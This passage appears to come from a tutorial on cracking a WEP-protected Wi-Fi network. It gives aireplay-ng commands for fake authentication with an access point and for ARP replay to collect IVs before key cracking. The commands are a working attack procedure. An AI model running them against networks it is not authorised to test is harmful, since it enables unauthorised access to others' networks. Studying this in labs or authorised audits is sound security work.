> Once we are doing the targeted sniff, we can try to fake authentication with the AP via broadcast deauth:

```
sudo aireplay-ng -1 3600 -q 10 -a <bssid> -e <essid> -c <station> wlan0mon
```

> This will start sending authentication requests, now we can open another terminal and generate traffic to find duplicate IV's:

```
sudo aireplay-ng -3 -b <bssid> -h <station> wlan0mon
```

Once we capture at least 10-15k ARP requests we can stop Aireplay and Airodump using CTRL + C then move on to cracking the key in the cap file.
